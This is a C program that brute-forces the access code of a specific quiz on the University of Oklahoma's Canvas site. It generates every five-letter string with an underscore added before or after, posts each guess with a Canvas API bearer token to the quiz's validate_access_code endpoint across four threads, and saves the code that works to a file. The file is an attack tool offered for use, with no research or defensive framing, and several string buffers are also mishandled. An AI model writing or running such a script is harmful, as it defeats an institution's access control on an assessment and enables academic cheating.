#include <stdio.h>
#include <curl/curl.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>

#define URL "https://canvas.ou.edu/api/v1/courses/315691/quizzes/518261/validate_access_code"
//#define URL "https://canvas.ou.edu/api/v1/courses/315691/quizzes/518259/validate_access_code"

struct MemoryStruct {
    char *memory;
    size_t size;
};

struct args{
    char* canvas_key;
    int a;
};

// Write callback function to handle received data
size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    mem->memory = realloc(mem->memory, mem->size + realsize + 1);
    if (mem->memory == NULL) {
        // out of memory
        printf("Not enough memory (realloc returned NULL)\n");
        return 0;
    }

    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}


int guess(char code[], char canvas_key[]){
	
	CURL* curl;
	CURLcode res;

	//struct to store the result of the POST request
	struct MemoryStruct chunk;

    chunk.memory = malloc(1);  // Start with an empty memory buffer
    chunk.size = 0;

	int is_correct = 0;

	curl = curl_easy_init();
	if(curl){
		//set the url
		curl_easy_setopt(curl, CURLOPT_URL, URL);
		
		//set the post data
		char access_code[50] = "access_code=";
		strcat(access_code, code);
		printf("Code : %s\n", code);
		printf("Query String : %s\n", access_code);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, access_code);
		
		//Create a list for custom headers
		struct curl_slist *headers = NULL;

		//add headers
		//headers = curl_slist_append(headers, "Content-Type: application/json");
		char auth[100] = "Authorization: Bearer ";
		strcat(auth, canvas_key);
		headers = curl_slist_append(headers, auth);

		//set the headers
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
	
		// Set the write callback function
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);

        // Pass the struct to the callback function
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

		// perform the request
		res = curl_easy_perform(curl);
		
		//error checking
		if(res != CURLE_OK){
			fprintf(stderr, "curl_easy_perform(), failed: %s\n", curl_easy_strerror(res));
		}

		printf("Result: %s\n ", chunk.memory);
		int comp = strcmp(chunk.memory, "true");
		if(comp == 0){
			is_correct = 1;
		}
		
		//clean up
		free(chunk.memory);
		curl_slist_free_all(headers); //free custom headers list
		curl_easy_cleanup(curl);
	}

	printf("\n");
	
	return is_correct;
}

char* gen_guess(int length){
	char* code = malloc((length) * sizeof(char));
	if(code == NULL){
		fprintf(stderr, "Memory allocation failed\n");
		exit(1);
	}

	const char charset[] = "abcdefghijklmnopqrstuvwxyz"; // Characters to choose from
    int charsetLength = sizeof(charset) - 1; // Length of the charset

    //srand(time(NULL)); // Seed the random number generator

    for (int i = 0; i < length; i++) {
        code[i] = charset[rand() % charsetLength]; // Pick a random character from the charset
    }

	//code[length] = '\0'; //add null terminator to end of string

	return code;
}

int random_guessing(char* canvas_key){
	int correct = 0;
	while(correct == 0){

		//clock_t start, end;
     	//double cpu_time_used;

		//start = clock();		

		int size = 5;
		char* code = gen_guess(size);
		
		char codeF[7] = "";
		strcat(codeF, code);
		codeF[5] = '_';
		codeF[6] = '\0';
		int res = guess(codeF, canvas_key);
		if(res == 1){
			printf("Correct Code: %s\n", codeF);
			correct = 1;
		}
	
		char codeL[7] = "";
		codeL[0] = '_';
		strcat(codeL, code);
		codeL[6] = '\0';
		res = guess(codeL, canvas_key);
		if(res == 1){
			printf("Correct Code: %s\n", codeL);
			correct = 1;
		}

		free(code);
		//correct = 1; //Temporary

		//end = clock();
		//printf("Time: %f\n", (double)(end - start)/CLOCKS_PER_SEC);
	}
	
	return correct;
}

int test_word(char* canvas_key, char* code){
	int correct = 0;

	char codeF[7] = "";
	strcat(codeF, code);
	codeF[5] = '_';
	codeF[6] = '\0';
	int res = guess(codeF, canvas_key);
	if(res == 1){
		printf("Correct Code: %s\n", codeF);
		correct = 1;
	}
	
	char codeL[7] = "";
	codeL[0] = '_';
	strcat(codeL, code);
	codeL[6] = '\0';
	res = guess(codeL, canvas_key);
	if(res == 1){
		printf("Correct Code: %s\n", codeL);
		correct = 1;
	}

	//free(code);
	
	return correct;
}

void* systematic_guessing(void* v){
	struct args *arg = (struct args *) v;
	char* canvas_key = arg->canvas_key;
	int a = arg->a;
	char letters[26] = "abcdefghijklmnopqrstuvwxyz";
	
	for(int zero = a; zero < 26; zero++){
		for(int one = 0; one < 26; one++){
			for(int two = 0; two < 26; two++){
				for(int three = 0; three < 26; three++){
					for(int four = 0; four < 26; four++){
						char* word = malloc(5*sizeof(char));
						word[0] = letters[zero];
						word[1] = letters[one];
						word[2] = letters[two];
						word[3] = letters[three];
						word[4] = letters[four];
						int correct = test_word(canvas_key, word);
						if(correct == 1){
							//write correct answer to txt file
							char* file_name = word;
							strcat(file_name, ".txt");
							FILE *f = fopen(file_name, "w");
							if (f == NULL)
							{
    							printf("Error opening file!\n");
    							exit(1);
							}
							fprintf(f, "Code: %s\n", word);
							fclose(f);

							
							return (void*)correct;
						}
						free(word);
					}
				}	
			}
		}
	}

	return (void*)0;
}

int main(int argc, char *argv[]){

	if(argc < 2){
		printf("Please provide canvas api key\n");
		return 1;
	}	
	
	char* canvas_key = argv[1];
	//printf("%s\n", canvas_key);
	

	int a = 4; //change this to change how far in the outer loop you want to skip	

	int n = 4; //how many threads to spawn 
	struct args arg[n];

	//arg.canvas_key = canvas_key;
	//arg.a = a;

	pthread_t thread_id[n];
        for(int i = 0; i < n; i++){
	    arg[i].canvas_key = canvas_key;
	    arg[i].a = i + a;
	    pthread_create(&thread_id[i], NULL, systematic_guessing, &arg[i]); 
	}

	for(int i = 0; i < n; i++){
	    pthread_join(thread_id[i], NULL);
	}
	//pthread_join(thread_id, NULL); 
	//int correct = random_guessing(canvas_key);
	//int a = 0, b = 0, c = 0, d = 0, e = 0;
	//int correct = systematic_guessing(canvas_key, a, b, c, d, e);
	//if(correct == 1){
	//	printf("Found answer\n");
	//}

	return 0;
}
